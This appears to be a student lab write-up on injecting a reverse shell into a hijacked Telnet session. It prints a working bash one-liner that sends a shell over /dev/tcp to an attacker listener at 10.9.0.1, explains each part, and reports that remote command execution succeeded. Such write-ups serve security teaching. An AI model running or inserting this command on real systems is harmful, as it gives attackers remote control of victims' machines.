""Goal""

The goal of this task was to inject a reverse shell command into the Telnet session.

This allows the attacker to gain remote shell access to the victim machine.


""How It Works""

The reverse shell command:

/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1

. Starts an interactive bash shell

. Redirects input and output to attacker

. Creates remote shell access


""Observations""

. After injection, the victim connected back to the attacker.

. Netcat showed "Connection received".

. I was able to execute commands remotely.